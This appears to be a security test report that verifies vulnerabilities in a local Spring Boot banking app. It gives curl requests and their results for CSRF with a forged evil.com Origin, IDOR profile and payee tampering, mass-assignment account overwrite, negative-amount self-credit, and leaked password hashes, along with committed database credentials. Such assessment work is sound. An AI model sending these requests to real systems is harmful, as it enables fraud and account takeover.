# Hunter Pipeline — Dynamic Validation (Runtime HTTP Verification)

Phase 3 of the Hunter Pipeline. The static validator produced **29 `confirmed_exploitable` + 3 `likely_exploitable` = 32 priority findings** (`validated-findings.md`, PR #24). This document records the result of **actually running the application and sending real HTTP requests** against each of those 32 findings.

## Environment

| Item | Value |
|---|---|
| Stack | Java 8, Spring Boot 1.5.4.RELEASE, Spring Security (form/session), Thymeleaf, MySQL |
| App | `userFront-0.0.1-SNAPSHOT.jar` on `http://localhost:8080` |
| DB | MySQL 5.7 (Docker), database `onlinebanking`, creds `root` / `avengers1993` (the committed creds, unmodified) |
| JDBC note | App started with `--spring.datasource.url=...?useSSL=false&allowPublicKeyRetrieval=true` (Connector/J 5.1.42 attempts SSL by default; only transport params were appended — username/password came from the committed `application.properties` verbatim) |
| Roles | App does **not** seed the `role` table; `ROLE_USER`/`ROLE_ADMIN` were inserted manually so `/signup` works (see "Setup notes & additional findings"). |

### Test accounts

| User | Role | Purpose |
|---|---|---|
| `alice` / `Password123` | ROLE_USER | attacker / regular user |
| `bob` / `Password123` | ROLE_USER | victim |
| `carol`, `dave` / `SamePass!1` | ROLE_USER | identical-password pair (salt test) |
| `adminx` / `AdminPass1` | ROLE_ADMIN (promoted in DB) | admin endpoints |
| `admin2` / `Admin2Pass` | ROLE_ADMIN (promoted in DB) | peer-admin target |

Sessions were obtained via `POST /index` (Spring Security login processing URL = login page `/index`, fields `username`/`password`); each login returned `302 → /userFront`.

## Classification key
- **dynamically_confirmed** — reachable and exploitable via HTTP at runtime (evidence captured).
- **dynamically_blocked** — a runtime control prevents the predicted exploit.
- **partially_testable** — confirmed by inspection/side-channel but not exercisable as a remote HTTP exploit (e.g. config disclosure).
- **setup_blocked** — could not be tested due to environment limitations.

---

## Results summary

| Disposition | Count | Finding IDs |
|---|---|---|
| **dynamically_confirmed** | 26 | CONFIG-MISCONFIG-001; ADMIN-AUTHZ-003, ADMIN-AUTHZ-004, ADMIN-IDOR-001/002/003/004/005, ADMIN-PRIVESC-001/002\*/003, ADMIN-SDE-001/002; AUTH-AUTHZ-001, AUTH-PRIVESC-001\*, AUTH-MISCONFIG-001, AUTH-SDE-001; ACCT-DEPOSIT-001, ACCT-WITHDRAW-001; XFER-INJ-002, XFER-CSRF-004, XFER-IDOR-001; APPT-IDOR-004, APPT-MASSASSIGN-001, APPT-IDOR-001, APPT-AUTHZ-001 |
| **dynamically_blocked** | 4 | CONFIG-CRYPTOFAIL-001, CONFIG-SDE-005, ADMIN-SDE-003, AUTH-CRYPTOFAIL-001 (all = "static BCrypt salt") |
| **partially_testable** | 2 | CONFIG-CRYPTOFAIL-003, CONFIG-SDE-001 (plaintext DB creds — config disclosure, no HTTP sink) |

\* `ADMIN-PRIVESC-002` / `AUTH-PRIVESC-001` (mass-assignment, both `likely_exploitable`): the **row-overwrite** and **`enabled` field** sub-claims are dynamically_confirmed; the **role-escalation** sub-claim is dynamically_blocked. `APPT-IDOR-001` (the third `likely_exploitable`) was **upgraded to dynamically_confirmed**.

> **Headline runtime correction:** the "static BCrypt salt" cluster (4 findings) is **NOT exploitable at runtime**. `new SecureRandom(SALT.getBytes())` *supplements* rather than replaces the RNG seed (per the `SecureRandom(byte[])` contract), so BCrypt still emits a **unique, random salt per hash**. Identical passwords produced different hashes, and the first signup after a fresh restart produced a different hash than the first signup of an earlier run. Hashes are **not** precomputable. See CRYPTO section for evidence.

---

## CONFIG domain

### CONFIG-MISCONFIG-001 / AUTH-MISCONFIG-001 — CSRF disabled app-wide → `dynamically_confirmed`
CSRF is disabled (`SecurityConfig.java:60 .csrf().disable()`). A state-changing `POST` with **no CSRF token and a forged `Origin`** is accepted:
```
$ curl -b alice.jar -X POST -H "Origin: http://evil.com" \
    http://localhost:8080/account/deposit -d "amount=12345&accountType=Primary"
-> HTTP 302 (redirect to /userFront)   # accepted; a CSRF-protected app returns 403
```
Every state-changing request in this document (deposits, transfers, profile edits, recipient delete, appointment create/confirm, admin enable/disable) succeeded with no token, corroborating this finding cross-cuttingly.

### CONFIG-CRYPTOFAIL-003 / CONFIG-SDE-001 — Plaintext DB credentials committed → `partially_testable`
`UserFront/src/main/resources/application.properties` (committed, `git log` commit `0a87e6a`):
```
spring.datasource.username = root
spring.datasource.password = avengers1993
```
The running application authenticated to MySQL using these **committed** credentials verbatim (only `useSSL`/`allowPublicKeyRetrieval` transport params were appended at launch). This confirms the credentials are real and live, but it is a **source/config disclosure**, not a remotely reachable HTTP exploit — hence `partially_testable`.

### CONFIG-CRYPTOFAIL-001 / CONFIG-SDE-005 — "Static BCrypt salt" → `dynamically_blocked`
See the consolidated **CRYPTO** section below. Refuted at runtime.

---

## CRYPTO — Static BCrypt salt cluster → `dynamically_blocked`
**Findings:** CONFIG-CRYPTOFAIL-001, CONFIG-SDE-005, ADMIN-SDE-003, AUTH-CRYPTOFAIL-001
**Static claim:** `new BCryptPasswordEncoder(12, new SecureRandom(SALT.getBytes()))` with `SALT="salt"` (`SecurityConfig.java:31,35`) makes salts deterministic → identical/precomputable hashes.

**Runtime result — claim does not hold:**

1. Identical passwords, **same run**, different hashes (`carol` and `dave`, both `SamePass!1`):
```
carol  $2a$12$C7f0DERItU.VR899KVH0qe6B8.0A5vcTOYEFmdCDaTt6Z2HZm/mOC
dave   $2a$12$EzqZ.PuFGUUDHARwFyghfO7W7DIQJVlQrakgYbS38n0OcskO2n6Y2
```
2. Identical passwords, **same instance**, different hashes (`saltuser1`, `saltuser2`, both `Password123`, fresh DB):
```
saltuser1  $2a$12$5WV/pb8gTsbxedvM263.7ODL5gnDhWMUq24UM0mp0MxtaBJERAfw.
saltuser2  $2a$12$U5CbXlY.k5pGKxQvmQrJvuO5D6NWZotdH6D2xpmIqj1fjTtKChG8e
```
3. **First** signup after a fresh restart vs first signup of an earlier run, same password `Password123`, different hashes:
```
alice      (run 1, 1st signup)  $2a$12$zfQkAg6UplpQISj67Rk8CeQaBQNXjzsJu/oI4aGD2IZ8dYP2xveAe
saltuser1  (run 2, 1st signup)  $2a$12$5WV/pb8gTsbxedvM263.7ODL5gnDhWMUq24UM0mp0MxtaBJERAfw.
```

**Mechanism:** `SecureRandom(byte[] seed)` *supplements* the existing (entropy-seeded) state rather than replacing it, so the generator is not deterministic. BCrypt therefore produces a unique random salt per hash. The exploit (precomputed tables / identical hashes revealing shared passwords) **cannot be performed**. Still a code smell (intent to hard-seed an RNG, and the constant is dead-weight), but **not runtime-exploitable** → `dynamically_blocked`.

---

## ADMIN domain (admin session `adminx` unless noted)

### ADMIN-SDE-001 / AUTH-SDE-001 / ADMIN-SDE-002 / ADMIN-IDOR-005 — `/api/user/all` leaks hashes + PII → `dynamically_confirmed`
`User.password` has **no `@JsonIgnore`** (`User.java:33`). `GET /api/user/all` returns every user with BCrypt hash, full PII and account graph:
```
$ curl -b adminx.jar http://localhost:8080/api/user/all   -> HTTP 200 (2896 bytes)
"password":"$2a$12$zfQkAg6UplpQISj67Rk8CeQaBQNXjzsJu/oI4aGD2IZ8dYP2xveAe"   # alice
"password":"$2a$12$pFihIzzKODt4EoZkjkN9cOCAnoCCPjlMc28wmsE9qkyXMiXbiu5Tm"   # bob
... (one per user)
alice -> {username, email, phone, firstName, lastName, password,
          primaryAccount:{id,accountNumber,accountBalance}}
```
This is a single endpoint exposing password hashes (SDE-001), over-exposed PII + account graph (SDE-002), and full user enumeration (IDOR-005).

### ADMIN-IDOR-001 / ADMIN-IDOR-002 — Read any user's transactions by `username` param → `dynamically_confirmed`
```
$ curl -b adminx.jar "http://localhost:8080/api/user/primary/transaction?username=alice"  -> HTTP 200
count=2
Deposit to Primary Account   1000000.0   1000000.0
Withdraw from Primary Account 5000000.0  -4000000.0
$ curl -b adminx.jar "http://localhost:8080/api/user/savings/transaction?username=bob"     -> HTTP 200
```
The handler takes an arbitrary `username` (`UserResource.java:35-43`), so any admin reads any account holder's ledger.

### ADMIN-IDOR-003 + ADMIN-AUTHZ-004 — Enable/disable any user via GET → `dynamically_confirmed`
```
bob.enabled = 1
$ curl -b adminx.jar http://localhost:8080/api/user/bob/disable  -> HTTP 200 ; bob.enabled = 0
$ curl -b adminx.jar http://localhost:8080/api/user/bob/enable   -> HTTP 200 ; bob.enabled = 1
```
`@RequestMapping` with no method (`UserResource.java:45-53`) makes these **GET-accessible state changes** (AUTHZ-004), affecting any user (IDOR-003).

### ADMIN-PRIVESC-001 — Admin disables a peer admin → `dynamically_confirmed`
```
admin2.enabled = 1
$ curl -b adminx.jar http://localhost:8080/api/user/admin2/disable  -> HTTP 200 ; admin2.enabled = 0
```
No protection of admin-role accounts; one admin can lock out another.

### ADMIN-PRIVESC-003 — Self re-enable via CSRF'd GET → `dynamically_confirmed`
`/api/user/{username}/enable` is a no-token GET (shown above), so a disabled-then-re-enabled flow is exploitable over a forged GET; covered by the enable evidence + CSRF-off.

### ADMIN-AUTHZ-003 — State change over GET + credentialed CORS → `dynamically_confirmed`
GET-based state changes (above) combined with CORS credentials:
```
$ curl -D- -H "Origin: http://evil.com" http://localhost:8080/index
Access-Control-Allow-Origin: http://localhost:4200
Access-Control-Allow-Credentials: true
```
`Access-Control-Allow-Credentials: true` is set globally (`RequestFilter.java:27`). Note `Access-Control-Allow-Origin` is **fixed to `http://localhost:4200`** (not reflected), so a browser would only honor cross-origin reads from that one origin; the GET + CSRF-off vector does not depend on CORS and is the primary driver.

### ADMIN-PRIVESC-002 / AUTH-PRIVESC-001 — Signup mass-assignment (`likely`) → `dynamically_confirmed` (row-overwrite + `enabled`); role-escalation `dynamically_blocked`
`HomeController.signupPost` binds the whole `@ModelAttribute User`.
- **Row overwrite (CONFIRMED, account takeover):** posting a new username with `userId=2` (an existing user's id) merged onto that row:
```
user_id=2 BEFORE: bob / bob@test.com
$ curl -X POST .../signup -d "username=mallory3&password=x&email=mallory3@test.com&userId=2..."  -> HTTP 302
user_id=2 AFTER:  mallory3 / mallory3@test.com     # bob's row overwritten
```
- **`enabled` mass-assign (CONFIRMED):** `POST /signup ...&enabled=false` persisted `mallory2.enabled = 0`.
- **Role escalation (BLOCKED):** posting `roleId=2` / `userRoles[0].role.name=ROLE_ADMIN` did **not** grant admin (role is set server-side to `ROLE_USER`; request returned the signup view, no admin row created). Consistent with the static `false_positive` for the role-escalation sub-claim.

---

## AUTH domain

### AUTH-AUTHZ-001 — `/user/profile` IDOR (edits by request-supplied username) → `dynamically_confirmed`
`UserController.profilePost` loads the target by `newUser.getUsername()` instead of the `Principal` (`UserController.java:31-44`). As `alice`:
```
bob BEFORE: first_name=Bob, last_name=Victim, phone=222
$ curl -b alice.jar -X POST http://localhost:8080/user/profile \
    -d "username=bob&firstName=PWNEDBYALICE&lastName=Hacked&email=bob@test.com&phone=66666666"  -> HTTP 200
bob AFTER:  first_name=PWNEDBYALICE, last_name=Hacked, phone=66666666
```
Cross-account profile modification confirmed.

---

## ACCT domain (session `alice`)

### ACCT-DEPOSIT-001 — No amount validation on deposit → `dynamically_confirmed`
Starting balance `0.00`, no funding source:
```
$ curl -b alice.jar -X POST http://localhost:8080/account/deposit -d "amount=1000000&accountType=Primary" -> HTTP 302
alice Primary balance: 0.00 -> 1000000.00
```
Arbitrary self-credit; `AccountServiceImpl.deposit` has no validation.

### ACCT-WITHDRAW-001 — Overdraft (no balance/amount check) → `dynamically_confirmed`
```
$ curl -b alice.jar -X POST http://localhost:8080/account/withdraw -d "amount=5000000&accountType=Primary" -> HTTP 302
alice Primary balance: 1000000.00 -> -4000000.00   # negative balance allowed
```

---

## XFER domain (session `alice` / `bob`)

### XFER-INJ-002 — Negative transfer amount credits the caller → `dynamically_confirmed`
`toSomeoneElseTransfer` does `balance.subtract(new BigDecimal(amount))` with no sign check (`TransactionServiceImpl.java:124-132`). A negative amount subtracts a negative → self-credit:
```
alice creates recipient "AliceSecret"
alice Primary BEFORE: -4000000.00
$ curl -b alice.jar -X POST http://localhost:8080/transfer/toSomeoneElse \
    -d "recipientName=AliceSecret&accountType=Primary&amount=-2000000"  -> HTTP 302
alice Primary AFTER:  -2000000.00   # +2,000,000 credited to the sender
```

### XFER-CSRF-004 — CSRF-forged transfer → `dynamically_confirmed`
The transfer above (and all POSTs) succeed with no CSRF token; combined with CONFIG-MISCONFIG-001 a cross-site forged transfer is viable.

### XFER-IDOR-001 — Global recipient read/delete by name (no ownership check) → `dynamically_confirmed`
`findRecipientByName` / `deleteByName` ignore ownership (`RecipientDao`, `TransferController.java:75-102`). As **bob** against **alice's** recipient:
```
$ curl -b bob.jar "http://localhost:8080/transfer/recipient/edit?recipientName=AliceSecret"   -> HTTP 200
  response HTML discloses: value="AliceSecret", value="secret@bank.com", accountNumber value="555000111"
$ curl -b bob.jar "http://localhost:8080/transfer/recipient/delete?recipientName=AliceSecret" -> HTTP 200
  recipient table now empty  # bob deleted alice's payee
```
Cross-user disclosure **and** deletion confirmed.

---

## APPT domain

### APPT-MASSASSIGN-001 — Self-confirm appointment via `confirmed=true` → `dynamically_confirmed`
`AppointmentController.createAppointmentPost` binds the whole `Appointment` (`confirmed` included). As `alice`:
```
$ curl -b alice.jar -X POST http://localhost:8080/appointment/create \
    -d "location=AliceBranch&description=Alice meeting&confirmed=true&dateString=2026-12-01 10:30" -> HTTP 302
appt id=1: confirmed=1, owner=alice   # pre-confirmed, bypassing admin approval
```

### APPT-IDOR-001 — Appointment overwrite via mass-assigned `id` (`likely`) → `dynamically_confirmed`
Posting `id=1` (alice's appointment) as **bob** merged/overwrote that row and reassigned it:
```
$ curl -b bob.jar -X POST http://localhost:8080/appointment/create \
    -d "id=1&location=BOB-OVERWRITE&description=Hijacked by bob&confirmed=true&dateString=2027-01-01 09:00" -> HTTP 302
appt id=1 AFTER: location=BOB-OVERWRITE, owner=bob   # was AliceBranch/alice
```
The "pending runtime confirmation" `likely_exploitable` is **confirmed**: JPA `merge` on a set id overwrites and reassigns another user's appointment.

### APPT-IDOR-004 — `/api/appointment/all` leaks raw `User` (hashes + PII) → `dynamically_confirmed`
`Appointment.user` has no `@JsonIgnore` (`Appointment.java:23-25`):
```
$ curl -b adminx.jar http://localhost:8080/api/appointment/all  -> HTTP 200
appt 1 -> user.password = $2a$12$pFihIzzKODt4EoZkjkN9cOCAn...  | user.email = bob@test.com
```
Second password-hash exfiltration sink (in addition to `/api/user/all`).

### APPT-AUTHZ-001 (= ADMIN-IDOR-004) — Confirm any appointment over GET → `dynamically_confirmed`
```
appt 1 confirmed BEFORE: 0
$ curl -b adminx.jar http://localhost:8080/api/appointment/1/confirm  -> HTTP 200 ; confirmed AFTER: 1
$ curl -b adminx.jar http://localhost:8080/api/appointment/99999/confirm -> HTTP 200   # see note
```
GET-based confirm of any appointment id. For a non-existent id, `confirmAppointment` NPEs (`findOne` returns null → `setConfirmed`), but the client still receives **HTTP 200** because `RequestFilter` swallows the exception (see additional findings).

---

## Setup notes & additional findings (discovered during testing)

These are robustness/security observations surfaced while running the app; not part of the 32-finding scope but worth feeding back to the pipeline.

1. **`RequestFilter` swallows all exceptions → errors masked as HTTP 200.** `RequestFilter.doFilter` wraps `chain.doFilter` in `try/catch(Exception e){ e.printStackTrace(); }` (`RequestFilter.java:30-34`). Server-side failures (e.g. the appointment-confirm NPE on a bad id) return a misleading `200` with no body. Hides errors from clients and complicates monitoring. (Overlaps the static `CONFIG-SDE-002` printStackTrace note.)
2. **Static, non-persistent account-number counter → collisions + signup DoS after restart.** `AccountServiceImpl.nextAccountNumber` is a `static int` starting at `11223145` (`AccountServiceImpl.java:24,105-107`). It resets to the initial value on every JVM restart, so post-restart signups regenerate account numbers that already exist; `findByAccountNumber` then throws `NonUniqueResultException` and signup fails (HTTP 200 due to #1). Reproduced: first signup after restart against a non-empty DB failed.
3. **App does not seed the `role` table.** `signup` calls `roleDao.findByName("ROLE_USER")`; on a fresh DB this returns `null`, producing `IllegalArgumentException: Target object must not be null` and every signup fails until roles are inserted. The app ships no bootstrap/seed for roles.
4. **`checkUserExists` logic bug.** `UserServiceImpl.checkUserExists(username,email)` calls `checkEmailExists(username)` — it passes the **username** where an email is expected (`UserServiceImpl.java:74-79`), weakening the duplicate-email guard.
5. **ADMIN-AUTHZ-001/002 (not in the 32 priority set):** the method-level `@PreAuthorize("hasRole('ADMIN')")` **does** block non-admins at runtime — `alice` → `/api/user/all` returned `403`, anonymous → `302` to `/index`. The class-level annotation works; the gap is defense-in-depth (no URL-layer rule), not a runtime privilege bypass.
